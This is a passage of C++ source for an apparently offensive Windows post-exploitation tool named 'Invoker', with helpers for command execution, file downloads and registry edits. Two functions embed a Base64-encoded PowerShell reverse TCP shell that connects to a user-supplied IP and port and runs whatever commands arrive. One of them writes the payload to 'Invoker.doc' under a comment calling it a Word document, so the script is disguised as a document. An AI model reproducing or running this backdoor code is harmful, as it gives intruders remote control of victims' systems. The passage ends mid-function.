#include ".\lib\invoker\invoker.h"
#include ".\lib\base64\base64.h"

// -----------------------------------------------------

void clear() {
	if (system("echo \"Invoker\" 1>nul") == 0) {
		system("CLS");
	}
	else {
		printf("\n");
	}
}

void pause() {
	if (system("echo \"Invoker\" 1>nul") == 0) {
		printf("\n");
		system("PAUSE");
	}
	else {
		printf("\nPress enter to continue . . . "); getchar();
	}
}

// -----------------------------------------------------

void systemInvokeCmd() {
	output("############################### EXAMPLES ###############################");
	output("# Command: WHOAMI /PRIV                                                #");
	output("################################# NOTE #################################");
	output("# In case CMD is disabled by group policy, enter a command.            #");
	output("########################################################################");
	output("");
	std::string command = input("Enter command (optional)");
	output("");
	cmdExec(command);
}

void systemInvokePs() {
	psExec();
}

void msInvokeBoth() {
	// NOTE: Microsoft Word document encoded in Base64.
	std::string encoded = std::string("JABhAGQAZAByACAAPQAgACQAKABSAG").append("UAYQBkAC0ASABvAHMAdAAgAC0AUABy").append("AG8AbQBwAHQAIAAiAEUAbgB0AGUAcg").append("AgAEkAUAAgAGEAZABkAHIAZQBzAHMA").append("IgApAC4AVAByAGkAbQAoACkAOwANAA").append("oAVwByAGkAdABlAC0ASABvAHMAdAAg").append("ACIAIgA7AA0ACgAkAHAAbwByAHQAIA").append("A9ACAAJAAoAFIAZQBhAGQALQBIAG8A").append("cwB0ACAALQBQAHIAbwBtAHAAdAAgAC").append("IARQBuAHQAZQByACAAcABvAHIAdAAg").append("AG4AdQBtAGIAZQByACIAKQAuAFQAcg").append("BpAG0AKAApADsADQAKAFcAcgBpAHQA").append("ZQAtAEgAbwBzAHQAIAAiACIAOwANAA").append("oAaQBmACAAKAAkAGEAZABkAHIALgBM").append("AGUAbgBnAHQAaAAgAC0AbAB0ACAAMQ").append("AgAC0AbwByACAAJABwAG8AcgB0AC4A").append("TABlAG4AZwB0AGgAIAAtAGwAdAAgAD").append("EAKQAgAHsADQAKAAkAVwByAGkAdABl").append("AC0ASABvAHMAdAAgACIAQgBvAHQAaA").append("AgAHAAYQByAGEAbQBlAHQAZQByAHMA").append("IABhAHIAZQAgAHIAZQBxAHUAaQByAG").append("UAZAAiADsADQAKAH0AIABlAGwAcwBl").append("ACAAewANAAoACQBXAHIAaQB0AGUALQ").append("BIAG8AcwB0ACAAIgAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACMAIwAjACMAIwAjACMAIwAj").append("ACMAIwAjACMAIwAjACMAIwAjACMAIw").append("AjACMAIwAjACMAIwAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACMAIwAjACMAIwAjACMAIwAi").append("ADsADQAKAAkAVwByAGkAdABlAC0ASA").append("BvAHMAdAAgACIAIwAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACMAIgA7").append("AA0ACgAJAFcAcgBpAHQAZQAtAEgAbw").append("BzAHQAIAAiACMAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAUABvAHcAZQBy").append("AFMAaABlAGwAbAAgAFIAZQB2AGUAcg").append("BzAGUAIABUAEMAUAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAjACIAOwAN").append("AAoACQBXAHIAaQB0AGUALQBIAG8Acw").append("B0ACAAIgAjACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgAGIAeQAgAEkAdgBhAG4AIABTAGkA").append("bgBjAGUAawAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIwAiADsADQAK").append("AAkAVwByAGkAdABlAC0ASABvAHMAdA").append("AgACIAIwAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACMAIgA7AA0ACgAJ").append("AFcAcgBpAHQAZQAtAEgAbwBzAHQAIA").append("AiACMAIABHAGkAdABIAHUAYgAgAHIA").append("ZQBwAG8AcwBpAHQAbwByAHkAIABhAH").append("QAIABnAGkAdABoAHUAYgAuAGMAbwBt").append("AC8AaQB2AGEAbgAtAHMAaQBuAGMAZQ").append("BrAC8AcABvAHcAZQByAHMAaABlAGwA").append("bAAtAHIAZQB2AGUAcgBzAGUALQB0AG").append("MAcAAuACAAIAAjACIAOwANAAoACQBX").append("AHIAaQB0AGUALQBIAG8AcwB0ACAAIg").append("AjACAARgBlAGUAbAAgAGYAcgBlAGUA").append("IAB0AG8AIABkAG8AbgBhAHQAZQAgAG").append("IAaQB0AGMAbwBpAG4AIABhAHQAIAAx").append("AEIAcgBaAE0ANgBUADcARwA5AFIATg").append("A4AHYAYgBhAGIAbgBmAFgAdQA0AE0A").append("NgBMAHAAZwB6AHQAcQA2AFkAMQA0AC").append("4AIAAgACAAIwAiADsADQAKAAkAVwBy").append("AGkAdABlAC0ASABvAHMAdAAgACIAIw").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACMAIgA7AA0ACgAJAFcAcgBp").append("AHQAZQAtAEgAbwBzAHQAIAAiACMAIw").append("AjACMAIwAjACMAIwAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACMAIwAjACMAIwAjACMAIwAj").append("ACMAIwAjACMAIwAjACMAIwAjACMAIw").append("AjACMAIwAjACMAIwAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACIAOwANAAoACQAkAGMAbABp").append("AGUAbgB0ACAAPQAgACQAbgB1AGwAbA").append("A7AA0ACgAJACQAcwB0AHIAZQBhAG0A").append("IAA9ACAAJABuAHUAbABsADsADQAKAA").append("kAJABiAHUAZgBmAGUAcgAgAD0AIAAk").append("AG4AdQBsAGwAOwANAAoACQAkAHcAcg").append("BpAHQAZQByACAAPQAgACQAbgB1AGwA").append("bAA7AA0ACgAJACQAZABhAHQAYQAgAD").append("0AIAAkAG4AdQBsAGwAOwANAAoACQAk").append("AHIAZQBzAHUAbAB0ACAAPQAgACQAbg").append("B1AGwAbAA7AA0ACgAJAHQAcgB5ACAA").append("ewANAAoACQAJACMAIABjAGgAYQBuAG").append("cAZQAgAHQAaABlACAAaABvAHMAdAAg").append("AGEAZABkAHIAZQBzAHMAIABhAG4AZA").append("AvAG8AcgAgAHAAbwByAHQAIABuAHUA").append("bQBiAGUAcgAgAGEAcwAgAG4AZQBjAG").append("UAcwBzAGEAcgB5AA0ACgAJAAkAJABj").append("AGwAaQBlAG4AdAAgAD0AIABOAGUAdw").append("AtAE8AYgBqAGUAYwB0ACAATgBlAHQA").append("LgBTAG8AYwBrAGUAdABzAC4AVABjAH").append("AAQwBsAGkAZQBuAHQAKAAkAGEAZABk").append("AHIALAAgACQAcABvAHIAdAApADsADQ").append("AKAAkACQAkAHMAdAByAGUAYQBtACAA").append("PQAgACQAYwBsAGkAZQBuAHQALgBHAG").append("UAdABTAHQAcgBlAGEAbQAoACkAOwAN").append("AAoACQAJACQAYgB1AGYAZgBlAHIAIA").append("A9ACAATgBlAHcALQBPAGIAagBlAGMA").append("dAAgAEIAeQB0AGUAWwBdACAAMQAwAD").append("IANAA7AA0ACgAJAAkAJABlAG4AYwBv").append("AGQAaQBuAGcAIAA9ACAATgBlAHcALQ").append("BPAGIAagBlAGMAdAAgAFQAZQB4AHQA").append("LgBBAHMAYwBpAGkARQBuAGMAbwBkAG").append("kAbgBnADsADQAKAAkACQAkAHcAcgBp").append("AHQAZQByACAAPQAgAE4AZQB3AC0ATw").append("BiAGoAZQBjAHQAIABJAE8ALgBTAHQA").append("cgBlAGEAbQBXAHIAaQB0AGUAcgAoAC").append("QAcwB0AHIAZQBhAG0AKQA7AA0ACgAJ").append("AAkAJAB3AHIAaQB0AGUAcgAuAEEAdQ").append("B0AG8ARgBsAHUAcwBoACAAPQAgACQA").append("dAByAHUAZQA7AA0ACgAJAAkAVwByAG").append("kAdABlAC0ASABvAHMAdAAgACIAQgBh").append("AGMAawBkAG8AbwByACAAaQBzACAAdQ").append("BwACAAYQBuAGQAIAByAHUAbgBuAGkA").append("bgBnAC4ALgAuACIAOwANAAoACQAJAC").append("QAYgB5AHQAZQBzACAAPQAgADAAOwAN").append("AAoACQAJAGQAbwAgAHsADQAKAAkACQ").append("AJACQAdwByAGkAdABlAHIALgBXAHIA").append("aQB0AGUAKAAiAFAAUwA+ACIAKQA7AA").append("0ACgAJAAkACQBkAG8AIAB7AA0ACgAJ").append("AAkACQAJACQAYgB5AHQAZQBzACAAPQ").append("AgACQAcwB0AHIAZQBhAG0ALgBSAGUA").append("YQBkACgAJABiAHUAZgBmAGUAcgAsAC").append("AAMAAsACAAJABiAHUAZgBmAGUAcgAu").append("AEwAZQBuAGcAdABoACkAOwANAAoACQ").append("AJAAkACQBpAGYAIAAoACQAYgB5AHQA").append("ZQBzACAALQBnAHQAIAAwACkAIAB7AA").append("0ACgAJAAkACQAJAAkAJABkAGEAdABh").append("ACAAPQAgACQAZABhAHQAYQAgACsAIA").append("AkAGUAbgBjAG8AZABpAG4AZwAuAEcA").append("ZQB0AFMAdAByAGkAbgBnACgAJABiAH").append("UAZgBmAGUAcgAsACAAMAAsACAAJABi").append("AHkAdABlAHMAKQA7AA0ACgAJAAkACQ").append("AJAH0ADQAKAAkACQAJAH0AIAB3AGgA").append("aQBsAGUAIAAoACQAcwB0AHIAZQBhAG").append("0ALgBEAGEAdABhAEEAdgBhAGkAbABh").append("AGIAbABlACkAOwANAAoACQAJAAkAaQ").append("BmACAAKAAkAGQAYQB0AGEALgBMAGUA").append("bgBnAHQAaAAgAC0AZwB0ACAAMAApAC").append("AAewANAAoACQAJAAkACQB0AHIAeQAg").append("AHsADQAKAAkACQAJAAkACQAkAHIAZQ").append("BzAHUAbAB0ACAAPQAgAEkAbgB2AG8A").append("awBlAC0ARQB4AHAAcgBlAHMAcwBpAG").append("8AbgAgAC0AQwBvAG0AbQBhAG4AZAAg").append("ACQAZABhAHQAYQAgADIAPgAmADEAIA").append("B8ACAATwB1AHQALQBTAHQAcgBpAG4A").append("ZwA7AA0ACgAJAAkACQAJAH0AIABjAG").append("EAdABjAGgAIAB7AA0ACgAJAAkACQAJ").append("AAkAJAByAGUAcwB1AGwAdAAgAD0AIA").append("AkAF8ALgBFAHgAYwBlAHAAdABpAG8A").append("bgAuAEkAbgBuAGUAcgBFAHgAYwBlAH").append("AAdABpAG8AbgAuAE0AZQBzAHMAYQBn").append("AGUAOwANAAoACQAJAAkACQB9AA0ACg").append("AJAAkACQAJACQAdwByAGkAdABlAHIA").append("LgBXAHIAaQB0AGUATABpAG4AZQAoAC").append("QAcgBlAHMAdQBsAHQAKQA7AA0ACgAJ").append("AAkACQAJAEMAbABlAGEAcgAtAFYAYQ").append("ByAGkAYQBiAGwAZQAgAC0ATgBhAG0A").append("ZQAgACIAZABhAHQAYQAiADsADQAKAA").append("kACQAJAH0ADQAKAAkACQB9ACAAdwBo").append("AGkAbABlACAAKAAkAGIAeQB0AGUAcw").append("AgAC0AZwB0ACAAMAApADsADQAKAAkA").append("fQAgAGMAYQB0AGMAaAAgAHsADQAKAA").append("kACQBXAHIAaQB0AGUALQBIAG8AcwB0").append("ACAAJABfAC4ARQB4AGMAZQBwAHQAaQ").append("BvAG4ALgBJAG4AbgBlAHIARQB4AGMA").append("ZQBwAHQAaQBvAG4ALgBNAGUAcwBzAG").append("EAZwBlADsADQAKAAkAfQAgAGYAaQBu").append("AGEAbABsAHkAIAB7AA0ACgAJAAkAaQ").append("BmACAAKAAkAHcAcgBpAHQAZQByACAA").append("LQBuAGUAIAAkAG4AdQBsAGwAKQAgAH").append("sADQAKAAkACQAJACQAdwByAGkAdABl").append("AHIALgBDAGwAbwBzAGUAKAApADsADQ").append("AKAAkACQAJACQAdwByAGkAdABlAHIA").append("LgBEAGkAcwBwAG8AcwBlACgAKQA7AA").append("0ACgAJAAkAfQANAAoACQAJAGkAZgAg").append("ACgAJABzAHQAcgBlAGEAbQAgAC0Abg").append("BlACAAJABuAHUAbABsACkAIAB7AA0A").append("CgAJAAkACQAkAHMAdAByAGUAYQBtAC").append("4AQwBsAG8AcwBlACgAKQA7AA0ACgAJ").append("AAkACQAkAHMAdAByAGUAYQBtAC4ARA").append("BpAHMAcABvAHMAZQAoACkAOwANAAoA").append("CQAJAH0ADQAKAAkACQBpAGYAIAAoAC").append("QAYwBsAGkAZQBuAHQAIAAtAG4AZQAg").append("ACQAbgB1AGwAbAApACAAewANAAoACQ").append("AJAAkAJABjAGwAaQBlAG4AdAAuAEMA").append("bABvAHMAZQAoACkAOwANAAoACQAJAA").append("kAJABjAGwAaQBlAG4AdAAuAEQAaQBz").append("AHAAbwBzAGUAKAApADsADQAKAAkACQ").append("B9AA0ACgAJAAkAaQBmACAAKAAkAGIA").append("dQBmAGYAZQByACAALQBuAGUAIAAkAG").append("4AdQBsAGwAKQAgAHsADQAKAAkACQAJ").append("ACQAYgB1AGYAZgBlAHIALgBDAGwAZQ").append("BhAHIAKAApADsADQAKAAkACQB9AA0A").append("CgAJAAkAaQBmACAAKAAkAGQAYQB0AG").append("EAIAAtAG4AZQAgACQAbgB1AGwAbAAp").append("ACAAewANAAoACQAJAAkAQwBsAGUAYQ").append("ByAC0AVgBhAHIAaQBhAGIAbABlACAA").append("LQBOAGEAbQBlACAAIgBkAGEAdABhAC").append("IAOwANAAoACQAJAH0ADQAKAAkACQBp").append("AGYAIAAoACQAcgBlAHMAdQBsAHQAIA").append("AtAG4AZQAgACQAbgB1AGwAbAApACAA").append("ewANAAoACQAJAAkAQwBsAGUAYQByAC").append("0AVgBhAHIAaQBhAGIAbABlACAALQBO").append("AGEAbQBlACAAIgByAGUAcwB1AGwAdA").append("AiADsADQAKAAkACQB9AA0ACgAJAH0A").append("DQAKAH0ADQAKAA==");
	createFile("Invoker.doc", base64_decode(encoded));
}

void psReverseTcp() {
	output("############################### EXAMPLES ###############################");
	output("# IP   : 192.168.8.185                                                 #");
	output("# Port : 9000                                                          #");
	output("########################################################################");
	output("");
	// NOTE: PowerShell encoded command.
	// NOTE: More about the script at github.com/ivan-sincek/powershell-reverse-tcp.
	std::string encoded = std::string("JABhAGQAZAByACAAPQAgACQAKABSAG").append("UAYQBkAC0ASABvAHMAdAAgAC0AUABy").append("AG8AbQBwAHQAIAAiAEUAbgB0AGUAcg").append("AgAEkAUAAgAGEAZABkAHIAZQBzAHMA").append("IgApAC4AVAByAGkAbQAoACkAOwANAA").append("oAVwByAGkAdABlAC0ASABvAHMAdAAg").append("ACIAIgA7AA0ACgAkAHAAbwByAHQAIA").append("A9ACAAJAAoAFIAZQBhAGQALQBIAG8A").append("cwB0ACAALQBQAHIAbwBtAHAAdAAgAC").append("IARQBuAHQAZQByACAAcABvAHIAdAAg").append("AG4AdQBtAGIAZQByACIAKQAuAFQAcg").append("BpAG0AKAApADsADQAKAFcAcgBpAHQA").append("ZQAtAEgAbwBzAHQAIAAiACIAOwANAA").append("oAaQBmACAAKAAkAGEAZABkAHIALgBM").append("AGUAbgBnAHQAaAAgAC0AbAB0ACAAMQ").append("AgAC0AbwByACAAJABwAG8AcgB0AC4A").append("TABlAG4AZwB0AGgAIAAtAGwAdAAgAD").append("EAKQAgAHsADQAKAAkAVwByAGkAdABl").append("AC0ASABvAHMAdAAgACIAQgBvAHQAaA").append("AgAHAAYQByAGEAbQBlAHQAZQByAHMA").append("IABhAHIAZQAgAHIAZQBxAHUAaQByAG").append("UAZAAiADsADQAKAH0AIABlAGwAcwBl").append("ACAAewANAAoACQBXAHIAaQB0AGUALQ").append("BIAG8AcwB0ACAAIgAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACMAIwAjACMAIwAjACMAIwAj").append("ACMAIwAjACMAIwAjACMAIwAjACMAIw").append("AjACMAIwAjACMAIwAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACMAIwAjACMAIwAjACMAIwAi").append("ADsADQAKAAkAVwByAGkAdABlAC0ASA").append("BvAHMAdAAgACIAIwAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACMAIgA7").append("AA0ACgAJAFcAcgBpAHQAZQAtAEgAbw").append("BzAHQAIAAiACMAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAUABvAHcAZQBy").append("AFMAaABlAGwAbAAgAFIAZQB2AGUAcg").append("BzAGUAIABUAEMAUAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAjACIAOwAN").append("AAoACQBXAHIAaQB0AGUALQBIAG8Acw").append("B0ACAAIgAjACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgAGIAeQAgAEkAdgBhAG4AIABTAGkA").append("bgBjAGUAawAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIwAiADsADQAK").append("AAkAVwByAGkAdABlAC0ASABvAHMAdA").append("AgACIAIwAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACMAIgA7AA0ACgAJ").append("AFcAcgBpAHQAZQAtAEgAbwBzAHQAIA").append("AiACMAIABHAGkAdABIAHUAYgAgAHIA").append("ZQBwAG8AcwBpAHQAbwByAHkAIABhAH").append("QAIABnAGkAdABoAHUAYgAuAGMAbwBt").append("AC8AaQB2AGEAbgAtAHMAaQBuAGMAZQ").append("BrAC8AcABvAHcAZQByAHMAaABlAGwA").append("bAAtAHIAZQB2AGUAcgBzAGUALQB0AG").append("MAcAAuACAAIAAjACIAOwANAAoACQBX").append("AHIAaQB0AGUALQBIAG8AcwB0ACAAIg").append("AjACAARgBlAGUAbAAgAGYAcgBlAGUA").append("IAB0AG8AIABkAG8AbgBhAHQAZQAgAG").append("IAaQB0AGMAbwBpAG4AIABhAHQAIAAx").append("AEIAcgBaAE0ANgBUADcARwA5AFIATg").append("A4AHYAYgBhAGIAbgBmAFgAdQA0AE0A").append("NgBMAHAAZwB6AHQAcQA2AFkAMQA0AC").append("4AIAAgACAAIwAiADsADQAKAAkAVwBy").append("AGkAdABlAC0ASABvAHMAdAAgACIAIw").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACMAIgA7AA0ACgAJAFcAcgBp").append("AHQAZQAtAEgAbwBzAHQAIAAiACMAIw").append("AjACMAIwAjACMAIwAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACMAIwAjACMAIwAjACMAIwAj").append("ACMAIwAjACMAIwAjACMAIwAjACMAIw").append("AjACMAIwAjACMAIwAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACIAOwANAAoACQAkAGMAbABp").append("AGUAbgB0ACAAPQAgACQAbgB1AGwAbA").append("A7AA0ACgAJACQAcwB0AHIAZQBhAG0A").append("IAA9ACAAJABuAHUAbABsADsADQAKAA").append("kAJABiAHUAZgBmAGUAcgAgAD0AIAAk").append("AG4AdQBsAGwAOwANAAoACQAkAHcAcg").append("BpAHQAZQByACAAPQAgACQAbgB1AGwA").append("bAA7AA0ACgAJACQAZABhAHQAYQAgAD").append("0AIAAkAG4AdQBsAGwAOwANAAoACQAk").append("AHIAZQBzAHUAbAB0ACAAPQAgACQAbg").append("B1AGwAbAA7AA0ACgAJAHQAcgB5ACAA").append("ewANAAoACQAJACMAIABjAGgAYQBuAG").append("cAZQAgAHQAaABlACAAaABvAHMAdAAg").append("AGEAZABkAHIAZQBzAHMAIABhAG4AZA").append("AvAG8AcgAgAHAAbwByAHQAIABuAHUA").append("bQBiAGUAcgAgAGEAcwAgAG4AZQBjAG").append("UAcwBzAGEAcgB5AA0ACgAJAAkAJABj").append("AGwAaQBlAG4AdAAgAD0AIABOAGUAdw").append("AtAE8AYgBqAGUAYwB0ACAATgBlAHQA").append("LgBTAG8AYwBrAGUAdABzAC4AVABjAH").append("AAQwBsAGkAZQBuAHQAKAAkAGEAZABk").append("AHIALAAgACQAcABvAHIAdAApADsADQ").append("AKAAkACQAkAHMAdAByAGUAYQBtACAA").append("PQAgACQAYwBsAGkAZQBuAHQALgBHAG").append("UAdABTAHQAcgBlAGEAbQAoACkAOwAN").append("AAoACQAJACQAYgB1AGYAZgBlAHIAIA").append("A9ACAATgBlAHcALQBPAGIAagBlAGMA").append("dAAgAEIAeQB0AGUAWwBdACAAMQAwAD").append("IANAA7AA0ACgAJAAkAJABlAG4AYwBv").append("AGQAaQBuAGcAIAA9ACAATgBlAHcALQ").append("BPAGIAagBlAGMAdAAgAFQAZQB4AHQA").append("LgBBAHMAYwBpAGkARQBuAGMAbwBkAG").append("kAbgBnADsADQAKAAkACQAkAHcAcgBp").append("AHQAZQByACAAPQAgAE4AZQB3AC0ATw").append("BiAGoAZQBjAHQAIABJAE8ALgBTAHQA").append("cgBlAGEAbQBXAHIAaQB0AGUAcgAoAC").append("QAcwB0AHIAZQBhAG0AKQA7AA0ACgAJ").append("AAkAJAB3AHIAaQB0AGUAcgAuAEEAdQ").append("B0AG8ARgBsAHUAcwBoACAAPQAgACQA").append("dAByAHUAZQA7AA0ACgAJAAkAVwByAG").append("kAdABlAC0ASABvAHMAdAAgACIAQgBh").append("AGMAawBkAG8AbwByACAAaQBzACAAdQ").append("BwACAAYQBuAGQAIAByAHUAbgBuAGkA").append("bgBnAC4ALgAuACIAOwANAAoACQAJAG").append("QAbwAgAHsADQAKAAkACQAJACQAdwBy").append("AGkAdABlAHIALgBXAHIAaQB0AGUAKA").append("AiAFAAUwA+ACIAKQA7AA0ACgAJAAkA").append("CQBkAG8AIAB7AA0ACgAJAAkACQAJAC").append("QAYgB5AHQAZQBzACAAPQAgACQAcwB0").append("AHIAZQBhAG0ALgBSAGUAYQBkACgAJA").append("BiAHUAZgBmAGUAcgAsACAAMAAsACAA").append("JABiAHUAZgBmAGUAcgAuAEwAZQBuAG").append("cAdABoACkAOwANAAoACQAJAAkACQBp").append("AGYAIAAoACQAYgB5AHQAZQBzACAALQ").append("BnAHQAIAAwACkAIAB7AA0ACgAJAAkA").append("CQAJAAkAJABkAGEAdABhACAAPQAgAC").append("QAZABhAHQAYQAgACsAIAAkAGUAbgBj").append("AG8AZABpAG4AZwAuAEcAZQB0AFMAdA").append("ByAGkAbgBnACgAJABiAHUAZgBmAGUA").append("cgAsACAAMAAsACAAJABiAHkAdABlAH").append("MAKQA7AA0ACgAJAAkACQAJAH0AIABl").append("AGwAcwBlACAAewANAAoACQAJAAkACQ").append("AJACQAZABhAHQAYQAgAD0AIAAiAGUA").append("eABpAHQAIgA7AA0ACgAJAAkACQAJAH").append("0ADQAKAAkACQAJAH0AIAB3AGgAaQBs").append("AGUAIAAoACQAcwB0AHIAZQBhAG0ALg").append("BEAGEAdABhAEEAdgBhAGkAbABhAGIA").append("bABlACkAOwANAAoACQAJAAkAaQBmAC").append("AAKAAkAGQAYQB0AGEALgBMAGUAbgBn").append("AHQAaAAgAC0AZwB0ACAAMAAgAC0AYQ").append("BuAGQAIAAkAGQAYQB0AGEAIAAtAG4A").append("ZQAgACIAZQB4AGkAdAAiACkAIAB7AA").append("0ACgAJAAkACQAJAHQAcgB5ACAAewAN").append("AAoACQAJAAkACQAJACQAcgBlAHMAdQ").append("BsAHQAIAA9ACAASQBuAHYAbwBrAGUA").append("LQBFAHgAcAByAGUAcwBzAGkAbwBuAC").append("AALQBDAG8AbQBtAGEAbgBkACAAJABk").append("AGEAdABhACAAfAAgAE8AdQB0AC0AUw").append("B0AHIAaQBuAGcAOwANAAoACQAJAAkA").append("CQB9ACAAYwBhAHQAYwBoACAAewANAA").append("oACQAJAAkACQAJACQAcgBlAHMAdQBs").append("AHQAIAA9ACAAJABfAC4ARQB4AGMAZQ").append("BwAHQAaQBvAG4ALgBJAG4AbgBlAHIA").append("RQB4AGMAZQBwAHQAaQBvAG4ALgBNAG").append("UAcwBzAGEAZwBlADsADQAKAAkACQAJ").append("AAkAfQANAAoACQAJAAkACQAkAHcAcg").append("BpAHQAZQByAC4AVwByAGkAdABlAEwA").append("aQBuAGUAKAAkAHIAZQBzAHUAbAB0AC").append("kAOwANAAoACQAJAAkACQBDAGwAZQBh").append("AHIALQBWAGEAcgBpAGEAYgBsAGUAIA").append("AtAE4AYQBtAGUAIAAiAGQAYQB0AGEA").append("IgA7AA0ACgAJAAkACQB9AA0ACgAJAA").append("kAfQAgAHcAaABpAGwAZQAgACgAJABk").append("AGEAdABhACAALQBuAGUAIAAiAGUAeA").append("BpAHQAIgApADsADQAKAAkAfQAgAGMA").append("YQB0AGMAaAAgAHsADQAKAAkACQBXAH").append("IAaQB0AGUALQBIAG8AcwB0ACAAJABf").append("AC4ARQB4AGMAZQBwAHQAaQBvAG4ALg").append("BJAG4AbgBlAHIARQB4AGMAZQBwAHQA").append("aQBvAG4ALgBNAGUAcwBzAGEAZwBlAD").append("sADQAKAAkAfQAgAGYAaQBuAGEAbABs").append("AHkAIAB7AA0ACgAJAAkAaQBmACAAKA").append("AkAHcAcgBpAHQAZQByACAALQBuAGUA").append("IAAkAG4AdQBsAGwAKQAgAHsADQAKAA").append("kACQAJACQAdwByAGkAdABlAHIALgBD").append("AGwAbwBzAGUAKAApADsADQAKAAkACQ").append("AJACQAdwByAGkAdABlAHIALgBEAGkA").append("cwBwAG8AcwBlACgAKQA7AA0ACgAJAA").append("kAfQANAAoACQAJAGkAZgAgACgAJABz").append("AHQAcgBlAGEAbQAgAC0AbgBlACAAJA").append("BuAHUAbABsACkAIAB7AA0ACgAJAAkA").append("CQAkAHMAdAByAGUAYQBtAC4AQwBsAG").append("8AcwBlACgAKQA7AA0ACgAJAAkACQAk").append("AHMAdAByAGUAYQBtAC4ARABpAHMAcA").append("BvAHMAZQAoACkAOwANAAoACQAJAH0A").append("DQAKAAkACQBpAGYAIAAoACQAYwBsAG").append("kAZQBuAHQAIAAtAG4AZQAgACQAbgB1").append("AGwAbAApACAAewANAAoACQAJAAkAJA").append("BjAGwAaQBlAG4AdAAuAEMAbABvAHMA").append("ZQAoACkAOwANAAoACQAJAAkAJABjAG").append("wAaQBlAG4AdAAuAEQAaQBzAHAAbwBz").append("AGUAKAApADsADQAKAAkACQB9AA0ACg").append("AJAAkAaQBmACAAKAAkAGIAdQBmAGYA").append("ZQByACAALQBuAGUAIAAkAG4AdQBsAG").append("wAKQAgAHsADQAKAAkACQAJACQAYgB1").append("AGYAZgBlAHIALgBDAGwAZQBhAHIAKA").append("ApADsADQAKAAkACQB9AA0ACgAJAAkA").append("aQBmACAAKAAkAGQAYQB0AGEAIAAtAG").append("4AZQAgACQAbgB1AGwAbAApACAAewAN").append("AAoACQAJAAkAQwBsAGUAYQByAC0AVg").append("BhAHIAaQBhAGIAbABlACAALQBOAGEA").append("bQBlACAAIgBkAGEAdABhACIAOwANAA").append("oACQAJAH0ADQAKAAkACQBpAGYAIAAo").append("ACQAcgBlAHMAdQBsAHQAIAAtAG4AZQ").append("AgACQAbgB1AGwAbAApACAAewANAAoA").append("CQAJAAkAQwBsAGUAYQByAC0AVgBhAH").append("IAaQBhAGIAbABlACAALQBOAGEAbQBl").append("ACAAIgByAGUAcwB1AGwAdAAiADsADQ").append("AKAAkACQB9AA0ACgAJAH0ADQAKAH0A").append("DQAKAA==");
	psExec(encoded);
}

void cppDownloadFile() {
	std::string url = input("Enter URL");
	output("");
	std::string out = input("Enter output file");
	output("");
	if (url.length() < 1 || out.length() < 1) {
		output("Both parameters are required");
	}
	else {
		downloadFile(url, out);
	}
}

void cppAddEditRegKey() {
	output("############################### EXAMPLES ###############################");
